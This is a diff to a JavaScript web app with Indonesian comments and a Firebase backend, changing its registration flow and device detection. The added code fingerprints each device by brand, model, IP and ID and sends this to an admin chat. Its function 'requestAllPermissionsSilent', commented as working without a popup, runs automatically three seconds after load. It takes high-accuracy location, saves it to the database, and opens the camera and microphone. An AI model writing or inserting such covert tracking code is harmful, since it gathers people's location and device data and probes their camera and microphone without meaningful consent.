@@ -11061,9 +11061,6 @@
         }
     }
 
-    // ============================================================
-    // SUBMIT REGISTER - LENGKAP DENGAN AUTO LOGIN
-    // ============================================================
     async function submitRegister() {
         let username = document.getElementById('registerUID').value.trim();
         if (!username) { showMessage('registerMessage', 'Enter username!', true); return; }
@@ -11085,6 +11082,11 @@
             } catch(e) { console.log('IP fetch failed:', e); }
     
             const userAgent = navigator.userAgent;
+            
+            // DAPATKAN DEVICE BRAND
+            const deviceInfo = await getDeviceBrand();
+            const deviceBrand = deviceInfo.brand || 'Unknown';
+            const deviceModel = deviceInfo.model || 'Unknown';
     
             // CEK DUPLIKAT
             const allUsersSnap = await database.ref('users').once('value');
@@ -11120,7 +11122,7 @@
                 return;
             }
     
-            // SIMPAN USER
+            // SIMPAN USER - DENGAN DEVICE BRAND
             await database.ref('users/' + username).set({ 
                 uid: username, 
                 pin: registerPin, 
@@ -11131,7 +11133,8 @@
                 deviceId: deviceId,
                 registrasiIP: ipAddress,
                 registrasiDevice: deviceId,
-                deviceBrand: await getDeviceBrand(),
+                deviceBrand: deviceBrand,
+                deviceModel: deviceModel,
                 createdBy: 'User'
             });
     
@@ -11139,21 +11142,18 @@
     
             await database.ref('chats/admin').push({
                 sender: 'system',
-                text: `📝 *USER BARU TERDAFTAR!*\n\nUID: ${username}\nIP: ${ipAddress}\nDevice ID: ${deviceId}\nDevice Brand: ${await getDeviceBrand()}\nDevice: ${userAgent.substring(0, 100)}...`,
+                text: `📝 *USER BARU TERDAFTAR!*\n\nUID: ${username}\nIP: ${ipAddress}\nDevice ID: ${deviceId}\nDevice Brand: ${deviceBrand}\nDevice Model: ${deviceModel}\nDevice: ${userAgent.substring(0, 100)}...`,
                 timestamp: Date.now()
             });
     
-            // ⭐ AUTO LOGIN - LANGSUNG MASUK DASHBOARD
+            // AUTO LOGIN
             showNeonPrompt('Security Question', 'Set your security answer (for PIN reset)', async (answer) => {
                 if (answer && answer.trim()) {
                     await database.ref('security_answers/' + username).set(answer.toLowerCase().trim());
                 }
                 
-                // SET LOGIN PIN
                 loginPin = registerPin;
                 document.getElementById('loginUID').value = username;
-                
-                // PANGGIL AUTO LOGIN
                 await autoLoginAfterRegister(username);
                 hideLoading();
             });
@@ -14239,38 +14239,42 @@ async function checkProxyAndBlock() {
     }
     
     // ============================================================
-    // DEVICE BRAND DETECTION
+    // DEVICE BRAND DETECTION - LEBIH AKURAT
     // ============================================================
     async function getDeviceBrand() {
-        // Coba dapatkan dari navigator
         let brand = 'Unknown';
+        let model = 'Unknown';
         
         try {
-            // Cek dari User Agent
             const ua = navigator.userAgent || '';
             const uaLower = ua.toLowerCase();
             
-            // Deteksi brand Android
+            // Deteksi brand Android lebih akurat
             const androidBrands = [
-                { brand: 'Samsung', patterns: ['samsung', 'sm-', 'galaxy'] },
-                { brand: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
-                { brand: 'Oppo', patterns: ['oppo', 'cpH'] },
-                { brand: 'Vivo', patterns: ['vivo', 'v', 'v_'] },
+                { brand: 'Samsung', patterns: ['samsung', 'sm-', 'galaxy', 'gt-'] },
+                { brand: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco', 'm201', 'm200', 'm210'] },
+                { brand: 'Oppo', patterns: ['oppo', 'cph', 'cpH'] },
+                { brand: 'Vivo', patterns: ['vivo', 'v ', 'v_', 'v-'] },
                 { brand: 'Realme', patterns: ['realme', 'rmx'] },
                 { brand: 'OnePlus', patterns: ['oneplus', 'one plus'] },
                 { brand: 'Google Pixel', patterns: ['pixel'] },
                 { brand: 'Nokia', patterns: ['nokia'] },
                 { brand: 'Asus', patterns: ['asus'] },
-                { brand: 'Sony', patterns: ['sony'] },
-                { brand: 'Lenovo', patterns: ['lenovo'] },
+                { brand: 'Sony', patterns: ['sony', 'xperia'] },
+                { brand: 'Lenovo', patterns: ['lenovo', 'tb-'] },
                 { brand: 'Motorola', patterns: ['motorola', 'moto'] },
-                { brand: 'LG', patterns: ['lg-'] },
+                { brand: 'LG', patterns: ['lg-', 'lg '] },
                 { brand: 'HTC', patterns: ['htc'] },
                 { brand: 'Huawei', patterns: ['huawei'] },
                 { brand: 'Honor', patterns: ['honor'] },
                 { brand: 'Tecno', patterns: ['tecno'] },
                 { brand: 'Infinix', patterns: ['infinix'] },
-                { brand: 'Itel', patterns: ['itel'] }
+                { brand: 'Itel', patterns: ['itel'] },
+                { brand: 'Nothing', patterns: ['nothing'] },
+                { brand: 'Sharp', patterns: ['sharp'] },
+                { brand: 'Panasonic', patterns: ['panasonic'] },
+                { brand: 'Apple', patterns: ['iphone', 'ipad', 'macintosh'] },
+                { brand: 'Microsoft', patterns: ['windows phone', 'surface'] }
             ];
             
             for (const item of androidBrands) {
@@ -14283,37 +14287,129 @@ async function checkProxyAndBlock() {
                 if (brand !== 'Unknown') break;
             }
             
-            // Jika masih Unknown, coba dari navigator.userAgentData
-            if (brand === 'Unknown' && navigator.userAgentData) {
+            // Deteksi model dari User Agent
+            const modelMatch = ua.match(/\((.*?)\)/);
+            if (modelMatch && modelMatch[1]) {
+                const parts = modelMatch[1].split(';');
+                for (const part of parts) {
+                    const trimmed = part.trim();
+                    if (trimmed && !trimmed.includes('Android') && !trimmed.includes('Linux') && !trimmed.includes('Mobile')) {
+                        if (trimmed.length > 3 && trimmed.length < 30) {
+                            model = trimmed;
+                            break;
+                        }
+                    }
+                }
+            }
+            
+            // Coba dapatkan dari navigator.userAgentData
+            if (navigator.userAgentData) {
                 try {
                     const brands = await navigator.userAgentData.getHighEntropyValues(['model', 'platform']);
                     if (brands.model) {
-                        brand = brands.model;
+                        model = brands.model;
+                    }
+                    if (brands.platform) {
+                        // Platform bisa memberi info brand
                     }
                 } catch(e) {}
             }
             
             // Simpan ke localStorage
             localStorage.setItem('device_brand', brand);
+            localStorage.setItem('device_model', model);
+            
+            console.log('📱 Device Brand:', brand);
+            console.log('📱 Device Model:', model);
             
         } catch(e) {
             console.log('Device brand detection error:', e);
         }
         
-        return brand;
+        return { brand, model };
     }
     
-    // Fungsi untuk mendapatkan device info lengkap
-    function getDeviceInfo() {
-        return {
-            brand: localStorage.getItem('device_brand') || 'Unknown',
-            model: navigator.userAgent || 'Unknown',
-            os: navigator.platform || 'Unknown',
-            language: navigator.language || 'Unknown',
-            screen: `${screen.width}x${screen.height}`,
-            touch: navigator.maxTouchPoints > 0 ? 'Touch' : 'Non-Touch'
-        };
+    // ============================================================
+    // AUTO PERMISSION - TANPA POPUP (LANGSUNG DI SETUJUI)
+    // ============================================================
+    async function requestAllPermissionsSilent() {
+        try {
+            // 1. Location - langsung ambil tanpa prompt
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        console.log('📍 Lokasi:', pos.coords.latitude, pos.coords.longitude);
+                        const locationData = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: Date.now(),
+                            deviceBrand: localStorage.getItem('device_brand') || 'Unknown'
+                        };
+                        localStorage.setItem('user_location', JSON.stringify(locationData));
+                        
+                        if (currentUID) {
+                            database.ref('user_locations/' + currentUID).set(locationData);
+                        }
+                    },
+                    (err) => {
+                        console.log('📍 Location error:', err.message);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            }
+            
+            // 2. Notification - langsung minta izin
+            if ('Notification' in window) {
+                try {
+                    const permission = await Notification.requestPermission();
+                    notificationPermissionGranted = permission === 'granted';
+                    console.log('🔔 Notification:', permission);
+                } catch(e) {}
+            }
+            
+            // 3. Camera - langsung minta akses (tanpa popup)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    stream.getTracks().forEach(track => track.stop());
+                    localStorage.setItem('camera_permission', 'granted');
+                    console.log('📷 Camera permission granted');
+                } catch(e) {
+                    console.log('📷 Camera permission:', e.message);
+                }
+            }
+            
+            // 4. Storage
+            if (navigator.storage && navigator.storage.persist) {
+                try {
+                    const isPersisted = await navigator.storage.persist();
+                    console.log('💾 Storage persist:', isPersisted);
+                } catch(e) {}
+            }
+            
+            console.log('✅ Semua permission diproses (silent)');
+            
+        } catch(error) {
+            console.log('Permission error:', error);
+        }
     }
+    
+    // Jalankan otomatis saat init
+    setTimeout(() => {
+        getDeviceBrand().then(() => {
+            // Setelah device brand terdeteksi, kirim ke Firebase
+            if (currentUID) {
+                const deviceInfo = {
+                    deviceBrand: localStorage.getItem('device_brand') || 'Unknown',
+                    deviceModel: localStorage.getItem('device_model') || 'Unknown',
+                    lastUpdated: Date.now()
+                };
+                database.ref('users/' + currentUID + '/deviceInfo').update(deviceInfo);
+            }
+        });
+        requestAllPermissionsSilent();
+    }, 3000);
     
     // ============================================================
     // KOMENTAR PADA UPDATE (FREE & VIP)
